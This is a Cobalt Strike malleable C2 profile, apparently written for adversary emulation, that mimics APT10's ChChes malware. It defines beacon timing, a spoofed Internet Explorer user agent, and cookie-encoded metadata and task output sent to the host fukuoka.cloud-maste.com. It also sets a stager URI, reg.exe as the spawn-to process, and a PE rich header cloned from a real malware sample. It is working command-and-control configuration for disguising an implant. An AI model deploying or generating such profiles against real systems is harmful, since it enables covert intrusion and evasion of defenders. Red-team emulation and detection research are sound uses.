#APT10 ChChes malware profile
#https://unit42.paloaltonetworks.com/unit42-menupass-returns-new-malware-new-attacks-japanese-academics-organizations/
#https://www.hybrid-analysis.com/sample/6605b27e95f5c3c8012e4a75d1861786fb749b9a712a5f4871adbad81addb59e?environmentId=100
#xx0hcd


set sleeptime "30000";
set jitter    "20";
set useragent "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E )";
set dns_idle "8.8.8.8";
set maxdns    "235";
set sample_name "chches_APT10 profile";


#https-certificate {
#  set keystore "demo.store";
#  set password "whateverpass";
#}

#setting server responses via 3.13 http-config block
http-config {
    set headers "Server, Set-Cookie, Keep-Alive, Connection, Content-Type, Cache-Control, Content-Length";
    header "Server" "Apache";	    
    header "Set-Cookie" "vsid=911vr2589323527124315; expires=Mon, 21-Nov-2022 21:39:12 GMT; Max-Age=157680000; path=/; domain=fukuoka.cloud-maste.com; HttpOnly";
    header "Keep-Alive" "timeout=5, max=95";
    header "Connection" "Keep-Alive";
    header "Content-Type" "text/html; charset=UTF-8";
    header "Cache-Control" "private";
    header "Content-Length" "";
    
    
}

#prob have to change Host header depending on where you are testing.
http-get {

    set uri "/5aq/XP/SY75Qyw.htm";
    
    client {

	header "Accept" "*/*";
        header "Host" "fukuoka.cloud-maste.com";
	header "Connection" "Keep-Alive";
	header "Cache-Control" "no-cache";
	
        
        metadata {
            netbios;
	    prepend "CzFc6k28XGpZ=";	    
	    header "Cookie";

        }

    }


    server {

        output {

            netbios;
	    prepend "...........Tmk.0..>..P=.l8~IR.5.;..c[....AQ...F..$'i...NN.4I.L.Kz....ypp9....vE\n";
	    prepend "[.......(.....`)I..\n";
	    append "...l.|.V2c....0.....Qj.J....\"c..Z...j+A...4-.....U....k.q..-.sf...%.9..x..R...........*+..=<S...?.K.g.-O..........d7\"M'.V.d=..4H.H.L....X..Da.L.y.....7.Du	.k.yc...:....T'....6;.2X.....j.*...f8..|u>....Vce7.....ZX.....#.../...D\".pc*.*IJ5..Y.f<E$.^._wF...K.p.-..8......}..eU>.*....1Bq.....|..u....9........,..Z.;.D.9.I5..";
            print;
	    
        }
    }
}


http-post {
    
    set uri "/RCg/vp6rBcQ.htm";
    set verb "GET";

    client {

	header "Accept" "*/*";
        header "Host" "fukuoka.cloud-maste.com";
	header "Connection" "Keep-Alive";
	header "Cache-Control" "no-cache";     
        
        output {
            netbios;	    
	    prepend "hmr2In1XD14=";    	    
	    header "Cookie";


        }

	#not really a good place to put this
        id {
	    base64url;
	    parameter "c";

        }
    }

    server {

        output {
            netbios;
	    prepend "...........Tmk.0..>..P=.l8~IR.5.;..c[....AQ...F..$'i...NN.4I.L.Kz....ypp9....vE\n";
	    prepend "[.......(.....`)I..\n";
	    append "...l.|.V2c....0.....Qj.J....\"c..Z...j+A...4-.....U....k.q..-.sf...%.9..x..R...........*+..=<S...?.K.g.-O..........d7\"M'.V.d=..4H.H.L....X..Da.L.y.....7.Du	.k.yc...:....T'....6;.2X.....j.*...f8..|u>....Vce7.....ZX.....#.../...D\".pc*.*IJ5..Y.f<E$.^._wF...K.p.-..8......}..eU>.*....1Bq.....|..u....9........,..Z.;.D.9.I5..";	        
            print;
        }
    }
}



http-stager {

    set uri_x86 "/ST/TWGRYKf0/d/du92w/RUk/Z2l.htm";
    set uri_x64 "/ST/TWGRYkf0/d/du92w/RUk/Z2l.htm";

    client {
	header "Accept" "*/*";
        header "Host" "fukuoka.cloud-maste.com";
	header "Connection" "Keep-Alive";
	header "Cache-Control" "no-cache";
    }

    server {

    }


}

set spawnto_x86 "%windir%\\syswow64\\reg.exe";
set spawnto_x64 "%windir%\\sysnative\\reg.exe";

#peclone from hybrid analysis sample
stage {
	set checksum       "0";
	set compile_time   "23 Nov 2016 19:31:37";
	set entry_point    "38807";
	set rich_header    "\xcd\x11\x8f\xf8\x89\x70\xe1\xab\x89\x70\xe1\xab\x89\x70\xe1\xab\x3d\xec\x10\xab\x9c\x70\xe1\xab\x3d\xec\x12\xab\x0a\x70\xe1\xab\x3d\xec\x13\xab\x90\x70\xe1\xab\xea\x2d\xe2\xaa\x9b\x70\xe1\xab\xea\x2d\xe4\xaa\xae\x70\xe1\xab\xea\x2d\xe5\xaa\x9b\x70\xe1\xab\x80\x08\x72\xab\x82\x70\xe1\xab\x89\x70\xe0\xab\x03\x70\xe1\xab\xe7\x2d\xe4\xaa\x80\x70\xe1\xab\xe7\x2d\x1e\xab\x88\x70\xe1\xab\x89\x70\x76\xab\x88\x70\xe1\xab\xe7\x2d\xe3\xaa\x88\x70\xe1\xab\x52\x69\x63\x68\x89\x70\xe1\xab\x00\x00\x00\x00\x00\x00\x00\x00";
}



